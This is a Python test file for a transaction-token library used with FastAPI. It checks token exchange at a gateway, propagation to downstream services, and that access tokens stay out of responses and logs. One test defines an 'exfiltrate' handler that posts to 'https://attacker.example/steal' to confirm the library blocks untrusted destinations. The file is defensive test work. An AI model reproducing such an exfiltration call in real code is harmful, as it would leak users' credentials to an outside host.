"""Initiation at the edge and propagation through services, all in process."""

import json
from typing import Annotated
from urllib.parse import parse_qs

import httpx
import pytest
from fastapi import Depends, FastAPI, Request

from _fastapi_testkit import LEDGER, TCTX, Kit, Transfer, ledger_app, serve
from pytrat.client import (
    AsyncTransactionClient,
    AsyncTransactionTokenClient,
    ExchangeRequest,
    WorkloadJwtAuth,
    current_transaction,
    optional_transaction,
)
from pytrat.core.constants import TOKEN_TYPE_TXN_TOKEN
from pytrat.core.crypto import private_key_to_pem
from pytrat.fastapi import PyTraT, Transaction, initiate_transaction

ACCESS_TOKEN = "user-access-token-SECRET-123"
TTS_URL = "https://tts.internal/token"
LEDGER_URL = "https://ledger.internal"


class NoCredential:
    def apply(self, request: ExchangeRequest) -> ExchangeRequest:
        return request


def tts(kit: Kit, requests: list[dict[str, list[str]]], *, fail: bool = False):
    def handle(request: httpx.Request) -> httpx.Response:
        form = parse_qs(request.content.decode())
        requests.append(form)
        if fail:
            return httpx.Response(400, json={"error": "invalid_grant"})
        details = json.loads(form["request_details"][0])
        token = kit.factory.mint(
            scope=form["scope"][0], tctx=details, req_wl="api-gateway", txn="txn-edge"
        )
        return httpx.Response(
            200,
            json={
                "access_token": token,
                "issued_token_type": TOKEN_TYPE_TXN_TOKEN,
                "token_type": "N_A",
            },
        )

    return AsyncTransactionTokenClient(
        TTS_URL,
        NoCredential(),
        kit.factory.verifier(),
        http_client=httpx.AsyncClient(transport=httpx.MockTransport(handle)),
    )


def gateway_app(kit: Kit, tts_client, downstream: AsyncTransactionClient) -> FastAPI:
    pytrat = PyTraT(service="api-gateway", verifier=kit.factory.verifier())
    app = FastAPI()
    pytrat.install(app)

    @app.post("/transfer")
    async def transfer(body: Transfer, request: Request) -> dict[str, object]:
        async with initiate_transaction(
            request,
            client=tts_client,
            audience=kit.factory.trust_domain,
            scope="payments.transfer",
            request_details=body.model_dump(),
        ) as txn:
            assert current_transaction() is txn
            # A compromised gateway would rewrite the amount here; this one does not.
            response = await downstream.post(
                f"{LEDGER_URL}/internal/transfer", json=body.model_dump()
            )
        assert optional_transaction() is None
        return {"downstream": response.status_code, "body": response.json()}

    return app


def workload_auth(kit: Kit, tmp_path, workload_id: str = "payment-service") -> WorkloadJwtAuth:
    key_file = tmp_path / "workload.pem"
    key_file.write_bytes(private_key_to_pem(kit.workload_key.private_key))
    return WorkloadJwtAuth(
        workload_id=workload_id,
        private_key_path=key_file,
        kid=kit.workload_key.kid,
        alg=kit.workload_key.alg,
        audiences={LEDGER_URL: LEDGER},
        clock=kit.factory.clock,
    )


async def test_gateway_initiates_and_ledger_enforces_end_to_end(kit: Kit, tmp_path) -> None:
    ledger_pytrat = kit.pytrat()
    ledger, seen = ledger_app(ledger_pytrat)
    downstream = AsyncTransactionClient(
        [LEDGER_URL],
        http_client=httpx.AsyncClient(transport=httpx.ASGITransport(app=ledger)),
        auth=workload_auth(kit, tmp_path),
    )
    requests: list[dict[str, list[str]]] = []
    gateway = gateway_app(kit, tts(kit, requests), downstream)
    async with (
        ledger_pytrat.lifespan(ledger),
        httpx.AsyncClient(
            transport=httpx.ASGITransport(app=gateway), base_url="https://gateway"
        ) as client,
    ):
        response = await client.post(
            "/transfer", json=TCTX, headers={"Authorization": f"Bearer {ACCESS_TOKEN}"}
        )
    assert response.status_code == 200
    assert response.json()["downstream"] == 200
    assert seen["txn"].id == "txn-edge"
    assert requests[0]["subject_token"] == [ACCESS_TOKEN]
    assert ACCESS_TOKEN not in response.text


async def test_edge_failures_never_reveal_the_access_token(
    kit: Kit, caplog: pytest.LogCaptureFixture
) -> None:
    downstream = AsyncTransactionClient([LEDGER_URL])
    gateway = gateway_app(kit, tts(kit, [], fail=True), downstream)
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=gateway), base_url="https://gateway"
    ) as client:
        refused = await client.post(
            "/transfer", json=TCTX, headers={"Authorization": f"Bearer {ACCESS_TOKEN}"}
        )
        missing = await client.post("/transfer", json=TCTX)
        malformed = await client.post(
            "/transfer", json=TCTX, headers={"Authorization": f"Basic {ACCESS_TOKEN}"}
        )
    assert refused.status_code == 502
    assert refused.json()["reason_code"] == "EXCHANGE_FAILED"
    assert missing.status_code == 401
    assert missing.headers["www-authenticate"] == "Bearer"
    assert missing.json()["reason_code"] == "SUBJECT_TOKEN_INVALID"
    assert malformed.status_code == 401
    for response in (refused, missing, malformed):
        assert ACCESS_TOKEN not in response.text
    assert all(ACCESS_TOKEN not in record.getMessage() for record in caplog.records)
    await downstream.aclose()


async def test_outbound_client_in_handler_propagates_the_same_token(kit: Kit) -> None:
    received: list[str | None] = []

    def audit_service(request: httpx.Request) -> httpx.Response:
        received.append(request.headers.get("Txn-Token"))
        assert "authorization" not in request.headers
        return httpx.Response(204)

    outbound = AsyncTransactionClient(
        ["https://audit.internal"],
        http_client=httpx.AsyncClient(transport=httpx.MockTransport(audit_service)),
    )
    pytrat = kit.pytrat()
    app = FastAPI()
    pytrat.install(app)
    dependency = pytrat.require_transaction(scope="payments.transfer")

    @app.post("/internal/async")
    async def async_handler(txn: Annotated[Transaction, Depends(dependency)]) -> None:
        await outbound.post("https://audit.internal/record")

    @app.post("/internal/sync")
    def sync_handler(txn: Annotated[Transaction, Depends(dependency)]) -> dict[str, str]:
        return {"txn": current_transaction().id}

    token = kit.factory.mint(txn="txn-prop")
    async with serve(app, pytrat) as client:
        await client.post("/internal/async", headers=kit.headers(token))
        sync = await client.post("/internal/sync", headers=kit.headers(token))
    assert received == [token]
    assert sync.json() == {"txn": "txn-prop"}
    assert optional_transaction() is None
    await outbound.aclose()


async def test_errors_raised_in_the_handler_carry_the_transaction_id(kit: Kit) -> None:
    outbound = AsyncTransactionClient(["https://audit.internal"])
    pytrat = kit.pytrat()
    app = FastAPI()
    pytrat.install(app)
    dependency = pytrat.require_transaction(scope="payments.transfer")

    @app.post("/internal/exfiltrate")
    async def exfiltrate(txn: Annotated[Transaction, Depends(dependency)]) -> None:
        await outbound.post("https://attacker.example/steal")

    async with serve(app, pytrat) as client:
        response = await client.post("/internal/exfiltrate", headers=kit.headers(txn="txn-handler"))
    assert response.status_code == 403
    assert response.json() == {
        "type": "urn:pytrat:problem:DESTINATION_NOT_TRUSTED",
        "title": "Transaction not authorized",
        "status": 403,
        "reason_code": "DESTINATION_NOT_TRUSTED",
        "transaction_id": "txn-handler",
    }
    await outbound.aclose()
